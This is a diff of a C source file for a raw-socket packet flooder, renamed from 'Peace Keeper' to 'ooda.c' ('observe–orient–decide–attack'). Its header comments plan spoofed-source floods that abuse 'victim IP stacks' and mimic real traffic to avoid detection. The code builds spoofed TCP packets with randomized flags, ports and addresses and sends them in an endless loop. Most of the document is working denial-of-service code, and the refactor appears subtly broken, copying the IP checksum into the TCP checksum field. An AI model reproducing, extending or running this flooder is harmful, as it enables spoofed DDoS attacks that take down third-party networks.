@@ -1,41 +1,70 @@
-﻿/*                   .ed"""" """$$$$be.                 FLAG LIST:       1 = FIN
-                   -"           ^""**$$$e.                               2 = SYN
-                 ."                   '$$$c                              3 = FIN+SYN
-                /                      "4$$b                             4 = RST
-               d  3                      $$$$                            5 = RST+FIN
-               $  *                   .$$$$$$                            6 = RST+SYN
-              .$  ^c           $$$$$e$$$$$$$$.                           7 = RST+SYN+FIN
-              d$L  4.         4$$$$$$$$$$$$$$b                           8 = PUSH
-              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$                           9 = PUSH+FIN
-  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$                          10 = PUSH+SYN
- z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c              11 = PUSH+SYN+FIN
-4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.              12 = PUSH+RST
-^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$             13 = PUSH+RST+FIN
-  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""              14 = PUSH+RST+SYN
-        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"               15 = PUSH+RST+SYN+FIN
-          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"                     16 = ACK
-             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"                       17 = ACK+FIN
-               "*$$$  *=%4.$ L L$ P3$$$F $$$P"                          18 = ACK+SYN
-                  "$   "%*ebJLzb$e$$$$$b $P"                            19 = ACK+SYN+FIN
-                    %..      4$$$$$$$$$$ "                              20 = ACK+RST
-                     $$$e   z$$$$$$$$$$%                                21 = ACK+RST+FIN
-                      "*$c  "$$$$$$$P"                                  22 = ACK+RST+SYN
-                       ."""*$$$$$$$$bc                                  23 = ACK+RST+SYN+FIN
-                    .-"    .$***$$$"""*e.                               24 = ACK+PUSH
-                 .-"    .e$"     "*$c  ^*b.                             25 = ACK+PUSH+FIN
-          .=*""""    .e$*"          "*bc  "*$e..                        26 = ACK+PUSH+SYN
-        .$"        .z*"               ^*$e.   "*****e.                  27 = ACK+PUSY+SYN+FIN
-        $$ee$c   .d"                     "*$.        3.                 28 = ACK+PUSH+RST
-        ^*$E")$..$"                         *   .ee==d%                 29 = ACK+PUSH+RST+FIN
-           $.d$$$*                           *  J$$$e*                  30 = ACK+PUSH+RST+SYN
-            """""                              "$$$"                    31 = ACK+PUSH+RST+SYN+FIN
-                                                                        32 = URGENT
-                                                                        63 = ACK+PUSH+RST+SYN+FIN+URG
-                                                                        64 = ECE/ECN
-                                                                       128 = CWR
-Peace Keeper: A TCP/IP IPv4 network stress tool.
-The traditional way of keeping the peace amongst the crowd.
-By darkness@efnet. // greetz vae@efnet.
+﻿/*
+
+     .... NO! ...                  ... MNO! ...
+   ..... MNO!! ...................... MNNOO! ...
+ ..... MMNO! ......................... MNNOO!! .
+..... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .
+ ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....
+    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...
+   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....
+   ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...
+    ....... MMMMM..    OPPMMP    .,OMI! ....
+     ...... MMMM::   o.,OPMP,.o   ::I!! ...
+         .... NNM:::.,,OOPM!P,.::::!! ....
+          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....
+         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....
+           .. MMMMMNNOOMMNNIIIPPPOO!! ......
+          ...... MMMONNMMNNNIIIOO!..........
+       ....... MN MOMMMNNNIIIIIO! OO ..........
+    ......... MNO! IiiiiiiiiiiiI OOOO ...........
+  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........
+   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........
+   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........
+      ...... OO! ................. ON! .......
+         ................................
+
+                    ooda.c
+        by: darkness / @efnutter @tcphdr
+          observe–orient–decide–attack.
+
+  ooda <mode> <dest> <src> <destport> <srcport> <flood-time> | OPTIONAL: <pkts-per-ip> <tcp-flags> <tcp-winsize> <tcp-ttl> <tcp-len> <udp-len> <icmptype> <icmpcode>
+
+  Modes:
+  1.) TCP mode: include pkts per ip, flags, winsize, ttl, (optional headers? discuss)
+  2.) UDP mode: include pkts per ip, udp len (optional headers/payloads? discuss)
+  3.) ICMP mode: (fairly useless) include pkts per ip, icmpcode and icmptype
+  4.) Combination mode of 1+2 (TCP+UDP)
+  5.) Combination mode of 1+3 (TCP+ICMP)
+  6.) Combination Mode of 2+3 (UDP+ICMP)
+  7.) Combination Mode of 1+2+3 (TCP+UDP+ICMP)
+
+  Main takeaways:
+  - Type of service options in IP headers, they seem to provide more relevance than previously thought. https://en.wikipedia.org/wiki/Type_of_service
+  - TCP Flag revisit, I think we've been doing it semi-wrong, see CWR, ECE and it's counterpart, ECN: https://gyazo.com/0a8d88697d53d8336b7cd52a98226903
+  - More intricacy to the abuse we can deliver to victim IP stacks, specifically abusing the tcp handshake. see: https://gyazo.com/bf3b47203cfdae00b4540923ef735778
+  - Validity, everything needs to be valid, to the checksums, mimic real packets as closely as possible, change as little as possible when needed.
+  - In addition to the added validitiy, this increases overall performance of the program, it is doing LESS.
+  - DIFFERENT protocol headers, see: https://gyazo.com/10ac48e7c968010eb0293e52d80a15f6
+  - CIDR spoofing, whether you want it read from a file or separated by -/: in a oneliner command, it's doable.
+  - Randomization is your friend, too much randomization is a dead giveaway, maybe try incremental window and ack/seqs?
+  - Prog Functionality: Getopt is looking like the viable option here, the arguments should follow:
+  - LEGEND:
+        -u Packets Per IP
+        -t Flood Timeout
+        -k Runtime Key
+        -m Packeter Mode
+        -h Victim IP/Class/FILE (separate by : or - for multiple?)
+        -s Source IP/Class/FILE (separate by : or - for multiple?)
+        -p Victim Port/Port Range (separate by : or - for multiple?)
+        -q Source Port/Port Range (separate by : or - for multiple?)
+        -g Type of Service (1-7, separate by : or - for multiple?)
+        -f TCP Flags (separate by : or - for multiple?)
+        -l ip ttl
+        -w tcp window size (embrace incremental window sizes, rely less on static/random sizes, remember we want to look like real TCP traffic, unusually large window sizes for small packets are dead giveaways.)
+        -x TCP Packet Size
+        -y UDP packet Size
+        -d icmptype
+        -f icmpcode
 */
 
 #include <stdio.h>
@@ -54,24 +83,29 @@ By darkness@efnet. // greetz vae@efnet.
 #include <stdbool.h>
 
 // Code configuration, don't modify unless you know what you're doing!
-#define PHI                           0xedc12       // Number generation seed
-#define FLAGLIST_DIGITAL_GANGSTA      129           // Digital Gangsta Stomper.
-#define FLAGLIST_RAND_TCP             130           // Used to wipe basically any unprotected, or poorly configured protected networks.
+// Definitions.
+#define PHI						      0x3133742069	// Random number generation seed.
+#define MAX_PACKET_LEN				  8192			// Max IP packet length.
 #define EPHEMERAL_PORT_MIN            16383         // Min ephemeral TCP port randomization
 #define EPHEMERAL_PORT_MAX            49152         // Max ephemeral TCP port randomization
 #define RAND_PORT_MIN                 1             // Min TCP port randomization
 #define RAND_PORT_MAX                 65534         // Max TCP port randomization
 #define TCP_WINDOW_SIZE_MIN           1             // Min TCP window size.
 #define TCP_WINDOW_SIZE_MAX           65534         // Max TCP window size.
-#define TCP_TTL_MIN                   1            // Min TCP TTL length
+#define TCP_TTL_MIN                   32            // Min TCP TTL length
 #define TCP_TTL_MAX                   255           // Max TCP TTL length
 #define TCP_DATA_LEN_MIN              0             // Min TCP data length
 #define TCP_DATA_LEN_MAX              1024          // Max TCP data length
-#define IP_RF                         0x8000        /* reserved fragment flag */
-#define IP_DF                         0x4000        /* dont fragment flag */
-#define IP_MF                         0x2000        /* more fragments flag */
-#define IP_OFFMASK                    0x1fff        /* mask for fragmenting bits */
-//#define DEBUG_TCP                                   /* Debugging purposes */
+#define UDP_DATA_LEN_MIN			  0				// Min UDP data length
+#define UDP_DATA_LEN_MAX		      65535         // Max UDP data length
+#define IP_RF                         0x8000        // reserved fragment flag 
+#define IP_DF                         0x4000        // dont fragment flag 
+#define IP_MF                         0x2000        // more fragments flag 
+#define IP_OFFMASK                    0x1fff        // mask for fragmenting bits 
+#define MAX_TARGETS					  10			// How many target IPs can we packet at once.
+#define FLAGLIST_DIGITAL_GANGSTA      129           // Digital Gangsta Stomper.
+#define FLAGLIST_RAND_TCP             130           // Used to wipe basically any unprotected, or poorly configured protected networks.
+
 
 // Spoofing Type Triggers
 bool destFullSpoof = false;
@@ -80,66 +114,51 @@ bool sourceRangeSpoof = false;
 bool destRangeSpoof = false;
 
 // Integers and Arrays
-int rawsock = 0;
-int ttime = 0;
-unsigned int srcaddr = 0;
-unsigned int dstaddr = 0;
+char datagram[MAX_PACKET_LEN] = { 0 };
 unsigned int a_flags[11] = { 0 };
 unsigned char currentFlag = { 0 };
-unsigned int start = 0;
-unsigned long long int packets = 0;
-unsigned short databytes = 0;
 unsigned char bytes[4] = { 0 };
 unsigned char bytes2[4] = { 0 };
 static uint32_t Q[4096], c = 518267;
+unsigned int srcaddr = 0;
+unsigned int dstaddr = 0;
+unsigned int start = 0;
+unsigned long long int packets = 0;
+unsigned short databytes = 0;
 unsigned int a = 0;
 unsigned int b = 0;
+int rawsock = 0;
+int ttime = 0;
 
 struct ip
 {
-    unsigned int ip_hl : 4;         /* header length */
-    unsigned int ip_v : 4;          /* version */
-    unsigned char ip_tos;           /* type of service */
-    unsigned short ip_len;          /* total length */
-    unsigned short ip_id;           /* identification */
-    unsigned short ip_off;          /* fragment offset field */
-    unsigned char ip_ttl;           /* time to live */
-    unsigned char ip_p;             /* protocol */
-    unsigned short ip_sum;          /* checksum */
-    struct in_addr ip_src, ip_dst;  /* source and dest address */
+    unsigned int ip_hl : 4;              // header length 
+    unsigned int ip_v : 4;               // version 
+    unsigned char ip_tos;                // type of service 
+    unsigned short ip_len;               // total length 
+    unsigned short ip_id;                // identification 
+    unsigned short ip_off;               // fragment offset field 
+    unsigned char ip_ttl;                // time to live 
+    unsigned char ip_p;                  // protocol 
+    unsigned short ip_sum;               // checksum 
+    struct in_addr ip_src, ip_dst;       // source and dest address 
 };
 
-/* rfc 793 tcp pseudo-header */
-struct ph
+struct tcp
 {
-    unsigned long saddr, daddr;
-    char mbz;
-    char ptcl;
-    unsigned short tcpl;
+    unsigned short th_sport;            // source port
+    unsigned short th_dport;            // destination port
+    unsigned int th_seq;                // sequence number
+    unsigned int th_ack;                // acknowledgement number
+    unsigned char th_x2 : 4;            // (unused field) 
+    unsigned char th_off : 4;           // TCP Offset
+    unsigned char th_flags;             // flags
+    unsigned short th_win;              // window
+    unsigned short th_sum;              // checksum
+    unsigned short th_urp;              // urgent pointer
 };
 
-struct
-{
-    char buf[1551 + 1];/* 64 kbytes for the packet */
-    char ph[1551 + 1];/* 64 bytes for the pseudo header packet */
-} tcpbuf;
-
-struct tcphdr2
-{
-    unsigned short th_sport;        /* source port */
-    unsigned short th_dport;        /* destination port */
-    unsigned int th_seq;            /* sequence number */
-    unsigned int th_ack;            /* acknowledgement number */
-    unsigned char th_x2 : 4;        /* (unused) */
-    unsigned char th_off : 4;       /* data offset */
-    unsigned char th_flags;         /* flags */
-    unsigned short th_win;          /* window */
-    unsigned short th_sum;          /* checksum */
-    unsigned short th_urp;          /* urgent pointer */
-
-};
-
-struct tcp_opthdr
+struct tcp_opt
 {
     unsigned char op0;
     unsigned char op1;
@@ -163,15 +182,27 @@ struct tcp_opthdr
     unsigned char op19;
 };
 
-// Assemble IP & TCP Header.
-struct ip* xf_iphdr = (struct ip*)tcpbuf.buf;
-struct tcphdr2* xf_tcphdr = (struct tcphdr2*)(tcpbuf.buf + sizeof(struct ip));
-// Assemble Pseudo Header.
-struct ph* ps_iphdr = (struct ph*)tcpbuf.ph;
-struct tcphdr2* ps_tcphdr = (struct tcphdr2*)(tcpbuf.ph + sizeof(struct ph));
-// Assemble TCP Option Header.
-struct tcp_opthdr* xf_tcpopt = (struct tcp_opthdr*)(tcpbuf.buf + sizeof(struct ip) + sizeof(struct tcphdr2));
-struct tcp_opthdr* ps_tcpopt = (struct tcp_opthdr*)(tcpbuf.ph + sizeof(struct ph) + sizeof(struct tcphdr2));
+struct udp
+{
+    unsigned short srcport;
+    unsigned short dstport;
+    unsigned short cksum;
+    unsigned short len;
+};
+
+struct icmp
+{
+    unsigned char type;
+    unsigned char code;
+    unsigned short int chksum;
+    unsigned short int id;
+    unsigned short int seq;
+};
+
+// Assemble Headers
+struct ip* pk_iphdr = (struct ip*)datagram;
+struct tcp* pk_tcphdr = (struct tcp*)(datagram + sizeof(struct ip));
+struct tcp_opt* pk_tcpopt = (struct tcp_opt*)(datagram + sizeof(struct ip) + sizeof(struct tcp));
 
 unsigned short csum(unsigned short* addr, int len)
 {
@@ -258,113 +289,94 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
 
     // Generate random data
     int x;
-    for (x = 0; x <= sizeof(tcpbuf.buf) - 1; x++)
+    for (x = 0; x <= sizeof(datagram); x++)
     {
-        tcpbuf.buf[x] = rand_cmwc();
+        datagram[x] = rand_cmwc();
     }
 
-    // copy into pseudo header
-    memcpy(tcpbuf.ph, tcpbuf.buf, sizeof(tcpbuf.ph));
-
-    ps_iphdr->mbz = 0;
-    xf_tcphdr->th_urp = 0;
-    xf_iphdr->ip_v = 4;
-    xf_iphdr->ip_hl = 5;
-    xf_iphdr->ip_tos = 0;
-    ps_iphdr->ptcl = IPPROTO_TCP;
-    xf_iphdr->ip_p = IPPROTO_TCP;
+    pk_tcphdr->th_urp = 0;
+    pk_iphdr->ip_v = 4;
+    pk_iphdr->ip_hl = 5;
+    pk_iphdr->ip_tos = 0;
+    pk_iphdr->ip_p = IPPROTO_TCP;
 
     // option headers
     // mss
-    xf_tcpopt->op0 = 2;
-    xf_tcpopt->op1 = 4;
-    xf_tcpopt->op2 = 6;
-    xf_tcpopt->op3 = 0xb4;
+    pk_tcpopt->op0 = 2;
+    pk_tcpopt->op1 = 4;
+    pk_tcpopt->op2 = 6;
+    pk_tcpopt->op3 = 0xb4;
     // sackok
-    xf_tcpopt->op4 = 4;
-    xf_tcpopt->op5 = 2;
+    pk_tcpopt->op4 = 4;
+    pk_tcpopt->op5 = 2;
     // timestamp
-    xf_tcpopt->op6 = 8;
-    xf_tcpopt->op7 = 0x0a;
-    xf_tcpopt->op8 = rand_cmwc();
-    xf_tcpopt->op9 = rand_cmwc();
-    xf_tcpopt->op10 = rand_cmwc();
-    xf_tcpopt->op11 = rand_cmwc();
-    xf_tcpopt->op12 = 0;
-    xf_tcpopt->op13 = 0;
-    xf_tcpopt->op14 = 0;
-    xf_tcpopt->op15 = 0;
+    pk_tcpopt->op6 = 8;
+    pk_tcpopt->op7 = 0x0a;
+    pk_tcpopt->op8 = rand_cmwc();
+    pk_tcpopt->op9 = rand_cmwc();
+    pk_tcpopt->op10 = rand_cmwc();
+    pk_tcpopt->op11 = rand_cmwc();
+    pk_tcpopt->op12 = 0;
+    pk_tcpopt->op13 = 0;
+    pk_tcpopt->op14 = 0;
+    pk_tcpopt->op15 = 0;
     // nop
-    xf_tcpopt->op16 = 0x01;
+    pk_tcpopt->op16 = 0x01;
     // window scaling
-    xf_tcpopt->op17 = 0x03;
-    xf_tcpopt->op18 = 0x03;
-    xf_tcpopt->op19 = 0x04;
+    pk_tcpopt->op17 = 0x03;
+    pk_tcpopt->op18 = 0x03;
+    pk_tcpopt->op19 = 0x04;
 
     // Set source address.
-    xf_iphdr->ip_src.s_addr = srcip;
-    ps_iphdr->saddr = xf_iphdr->ip_src.s_addr;
+    pk_iphdr->ip_src.s_addr = srcip;
 
     // Set destination address.
-    ps_iphdr->daddr = dstip;
-    xf_iphdr->ip_dst.s_addr = dstip;
-    sin.sin_addr.s_addr = ps_iphdr->daddr;
+    pk_iphdr->ip_dst.s_addr = dstip;
+    sin.sin_addr.s_addr = dstip;
 
     // Set source & destination ports
-    xf_tcphdr->th_sport = htons(srcport);
-    ps_tcphdr->th_sport = htons(srcport);
-    xf_tcphdr->th_dport = htons(dstport);
-    ps_tcphdr->th_dport = htons(dstport);
-    sin.sin_port = xf_tcphdr->th_dport;
+    pk_tcphdr->th_sport = htons(srcport);
+    pk_tcphdr->th_dport = htons(dstport);
+    sin.sin_port = pk_tcphdr->th_dport;
 
     // Set window size and ttl
-    xf_tcphdr->th_win = htons(winsize);
-    xf_iphdr->ip_ttl = ttl;
+    pk_tcphdr->th_win = htons(winsize);
+    pk_iphdr->ip_ttl = ttl;
 
     // Set IP ID randomly.
-    xf_iphdr->ip_id = htons(rand_cmwc());
+    pk_iphdr->ip_id = htons(rand_cmwc());
 
     // Set the TCP flag(s)
-    xf_tcphdr->th_flags = flags;
+    pk_tcphdr->th_flags = flags;
 
     // Set the ACK and SEQ
-    if (xf_tcphdr->th_flags == 2)
+    if (pk_tcphdr->th_flags == 2)
     {
-        xf_tcphdr->th_seq = htonl(0);
-        xf_tcphdr->th_ack = htonl(0);
+        pk_tcphdr->th_seq = htonl(0);
+        pk_tcphdr->th_ack = htonl(0);
     }
     else
     {
-        xf_tcphdr->th_seq = htonl(rand_cmwc());
-        xf_tcphdr->th_ack = htonl(rand_cmwc());
+        pk_tcphdr->th_seq = htonl(rand_cmwc());
+        pk_tcphdr->th_ack = htonl(rand_cmwc());
     }
 
-    // Calculate IP len and offset
-    xf_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
-    xf_iphdr->ip_off = htons(0x4000);
+    // Calculate IP length, offset. 
+    pk_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes);
+    pk_tcphdr->th_off = (sizeof(struct tcp) + sizeof(struct tcp_opt)) / 4;
+    pk_iphdr->ip_off = htons(0x4000);
 
-    // Calculate TCP length and offset
-    ps_iphdr->tcpl = htons(sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
-    xf_tcphdr->th_off = (sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr))  / 4;
-
-    // Copy TCP header into pseudo header and copy TCP option header into pseudo option header
-    memcpy(ps_tcphdr, xf_tcphdr, sizeof(struct tcphdr2));
-    memcpy(ps_tcpopt, xf_tcpopt, sizeof(struct tcp_opthdr));
-
-    // Calculate TCP checksum
-    //xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.buf, sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
-    xf_tcphdr->th_sum = 0;
+    // Calculate Checksum.
+    pk_iphdr->ip_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes);
+    pk_tcphdr->th_sum = pk_iphdr->ip_sum;
 
 #ifdef DEBUG_TCP
-    printf("> Pseudo HDR: %u\n", sizeof(struct ph));
-    printf("> IP HDR: %u\n", sizeof(struct ip));
-    printf("> TCP HDR: %u\n", sizeof(struct tcphdr2));
-    printf("> TCP OPTHDR: %u\n", sizeof(struct tcp_opthdr));
-    printf("> Databytes: %u\n", databytes);
-    printf("> th_sum: %u\n", xf_tcphdr->th_sum);
-    printf("> TCP Packet Size: %zu\n", sizeof(struct ph) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
-#else
-    printf("TCP Packet Size: %zu\n", sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
+    printf("> Loop IP HDR: %u\n", sizeof(struct ip));
+    printf("> Loop TCP HDR: %u\n", sizeof(struct tcp));
+    printf("> Loop TCP OPTHDR: %u\n", sizeof(struct tcp_opt));
+    printf("> Loop Databytes: %u\n", databytes);
+    printf("> Loopth_sum: %u\n", pk_tcphdr->th_sum);
+    printf("> TCP Packet Size: %zu\n", sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes);
 #endif
 
     while (true)
@@ -389,8 +401,7 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
                 }
             }
             else srcaddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
-            xf_iphdr->ip_src.s_addr = srcaddr;
-            ps_iphdr->saddr = xf_iphdr->ip_src.s_addr;
+            pk_iphdr->ip_src.s_addr = srcaddr;
         }
         if (destFullSpoof == true)
         {
@@ -403,9 +414,8 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
                 }
             }
             else dstaddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
-            ps_iphdr->daddr = dstaddr;
-            xf_iphdr->ip_dst.s_addr = ps_iphdr->daddr;
-            sin.sin_addr.s_addr = ps_iphdr->daddr;
+            pk_iphdr->ip_dst.s_addr = dstaddr;
+            sin.sin_addr.s_addr = dstaddr;
         }
         if (destRangeSpoof == true)
         {
@@ -418,9 +428,8 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
             if (bytes2[1] == '\0')
                 bytes2[1] = (rand_cmwc() >> 8) & 0xFF;
             dstaddr = (bytes2[0] << 24) | (bytes2[1] << 16) | (bytes2[2] << 8) | bytes2[3];
-            ps_iphdr->daddr = dstaddr;
-            xf_iphdr->ip_dst.s_addr = ps_iphdr->daddr;
-            sin.sin_addr.s_addr = ps_iphdr->daddr;
+            pk_iphdr->ip_dst.s_addr = dstaddr;
+            sin.sin_addr.s_addr = dstaddr;
         }
         if (sourceRangeSpoof == true)
         {
@@ -433,105 +442,94 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
             if (bytes[1] == '\0')
                 bytes[1] = (rand_cmwc() >> 8) & 0xFF;
             srcaddr = (bytes[0] << 24) | (bytes[1] << 16) | (bytes[2] << 8) | bytes[3];
-            xf_iphdr->ip_src.s_addr = srcaddr;
-            ps_iphdr->saddr = xf_iphdr->ip_src.s_addr;
+            pk_iphdr->ip_src.s_addr = srcaddr;
         }
 
         // Flag randomizations.
         if (flags == FLAGLIST_RAND_TCP)
         {
-            xf_tcphdr->th_flags = a_flags[(rand_cmwc() % 10) + 1];
+            pk_tcphdr->th_flags = a_flags[(rand_cmwc() % 10) + 1];
         }
         if (flags == FLAGLIST_DIGITAL_GANGSTA)
         {
-            xf_tcphdr->th_flags = a_flags[(rand_cmwc() % 11) + 1];
+            pk_tcphdr->th_flags = a_flags[(rand_cmwc() % 11) + 1];
         }
         // If packet flag is SYN, set TCP-ACK and TCP-SEQ accordingly.
-        if (xf_tcphdr->th_flags == 2)
+        if (pk_tcphdr->th_flags == 2)
         {
-            xf_tcphdr->th_seq = htonl(0);
-            xf_tcphdr->th_ack = htonl(0);
+            pk_tcphdr->th_seq = htonl(0);
+            pk_tcphdr->th_ack = htonl(0);
         }
         else
         {
-            xf_tcphdr->th_seq = htonl(rand_cmwc());
-            xf_tcphdr->th_ack = htonl(rand_cmwc());
+            pk_tcphdr->th_seq = htonl(rand_cmwc());
+            pk_tcphdr->th_ack = htonl(rand_cmwc());
         }
 
         // Randomize TSVal
-        xf_tcpopt->op8 = rand_cmwc();
-        xf_tcpopt->op9 = rand_cmwc();
-        xf_tcpopt->op10 = rand_cmwc();
-        xf_tcpopt->op11 = rand_cmwc();
+        pk_tcpopt->op8 = rand_cmwc();
+        pk_tcpopt->op9 = rand_cmwc();
+        pk_tcpopt->op10 = rand_cmwc();
+        pk_tcpopt->op11 = rand_cmwc();
 
         // Randomize IP ID
-        xf_iphdr->ip_id = htons(rand_cmwc());
+        pk_iphdr->ip_id = htons(rand_cmwc());
 
         // Randomize winsize
         if (winsize == 1)
         {
-            xf_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
+            pk_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
         }
         else if (winsize == 2)
         {
-            xf_tcphdr->th_win = htons(((rand_cmwc() > RAND_MAX / 2) ? 64800 : 64240));
+            pk_tcphdr->th_win = htons(((rand_cmwc() > RAND_MAX / 2) ? 64800 : 64240));
         }
         // Randomize TTL
         if (ttl == 0)
         {
-            xf_iphdr->ip_ttl = ((rand_cmwc() % TCP_TTL_MAX) + TCP_TTL_MIN);
+            pk_iphdr->ip_ttl = ((rand_cmwc() % TCP_TTL_MAX) + TCP_TTL_MIN);
         }
         // Randomized source ports
         if (dstport == 0)
         {
-            xf_tcphdr->th_dport = htons(((rand_cmwc() % RAND_PORT_MAX) + RAND_PORT_MIN));
-            ps_tcphdr->th_dport = xf_tcphdr->th_dport;
-            sin.sin_port = xf_tcphdr->th_dport;
+            pk_tcphdr->th_dport = htons(((rand_cmwc() % RAND_PORT_MAX) + RAND_PORT_MIN));
+            sin.sin_port = pk_tcphdr->th_dport;
         }
         else if (dstport == 1)
         {
-            xf_tcphdr->th_dport = htons(((rand_cmwc() % EPHEMERAL_PORT_MIN) + EPHEMERAL_PORT_MAX));
-            ps_tcphdr->th_dport = xf_tcphdr->th_dport;
-            sin.sin_port = xf_tcphdr->th_dport;
+            pk_tcphdr->th_dport = htons(((rand_cmwc() % EPHEMERAL_PORT_MIN) + EPHEMERAL_PORT_MAX));
+            sin.sin_port = pk_tcphdr->th_dport;
         }
         // Randomized destination ports
         if (srcport == 0)
         {
-            xf_tcphdr->th_sport = htons(((rand_cmwc() % RAND_PORT_MAX) + RAND_PORT_MIN));
-            ps_tcphdr->th_sport = xf_tcphdr->th_sport;
+            pk_tcphdr->th_sport = htons(((rand_cmwc() % RAND_PORT_MAX) + RAND_PORT_MIN));
         }
         else if (srcport == 1)
         {
-            xf_tcphdr->th_sport = htons(((rand_cmwc() % EPHEMERAL_PORT_MIN) + EPHEMERAL_PORT_MAX));
-            ps_tcphdr->th_sport = xf_tcphdr->th_sport;
+            pk_tcphdr->th_sport = htons(((rand_cmwc() % EPHEMERAL_PORT_MIN) + EPHEMERAL_PORT_MAX));
         }
 
-        // Calculate IP len
-        xf_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
+        // Calculate IP length, offset. 
+        pk_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes);
+        pk_tcphdr->th_off = (sizeof(struct tcp) + sizeof(struct tcp_opt)) / 4;
+        pk_iphdr->ip_off = htons(0x4000);
 
-        // Calculate TCP len and offset
-        ps_iphdr->tcpl = htons(sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
-        xf_tcphdr->th_off = (sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr)) / 4;
+        // Calculate Checksum.
+        pk_iphdr->ip_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes);
+        pk_tcphdr->th_sum = pk_iphdr->ip_sum;
 
-        // Copy TCP header into pseudo header and copy TCP option header into pseudo option header
-        memcpy(ps_tcphdr, xf_tcphdr, sizeof(struct tcphdr2));
-        memcpy(ps_tcpopt, xf_tcpopt, sizeof(struct tcp_opthdr));
-
-        // Calculate TCP checksum
-        xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.buf, sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
-
-        #ifdef DEBUG_TCP
-        printf("> Loop Pseudo HDR: %u\n", sizeof(struct ph));
+#ifdef DEBUG_TCP
         printf("> Loop IP HDR: %u\n", sizeof(struct ip));
-        printf("> Loop TCP HDR: %u\n", sizeof(struct tcphdr2));
-        printf("> Loop TCP OPTHDR: %u\n", sizeof(struct tcp_opthdr));
+        printf("> Loop TCP HDR: %u\n", sizeof(struct tcp));
+        printf("> Loop TCP OPTHDR: %u\n", sizeof(struct tcp_opt));
         printf("> Loop Databytes: %u\n", databytes);
-        printf("> Loopth_sum: %u\n", xf_tcphdr->th_sum);
-        printf("> TCP Packet Size: %zu\n", sizeof(struct ph) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
-        #endif
+        printf("> Loopth_sum: %u\n", pk_tcphdr->th_sum);
+        printf("> TCP Packet Size: %zu\n", sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes);
+#endif
 
         // Send our newly modified loop packet.
-        sendto(rawsock, tcpbuf.buf, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes, 0, (struct sockaddr*)&sin, sizeof(sin)), packets++;
+        sendto(rawsock, datagram, sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes, 0, (struct sockaddr*)&sin, sizeof(sin)), packets++;
     }
 }
 
@@ -541,7 +539,7 @@ int main(int argc, char** argv)
     unsigned char flags, ttl;
     int tmp = 1;
     const int* val = &tmp;
-    
+
 
     // Seed number randomization features.
     init_rand(time(NULL));
@@ -633,7 +631,7 @@ int main(int argc, char** argv)
         printf("-> Acceptable TCP window sizes are between 0 and 65535.\n");
         exit(-1);
     }
-    
+
     // Parse dest IP input.
     if (dstip <= 0)
     {
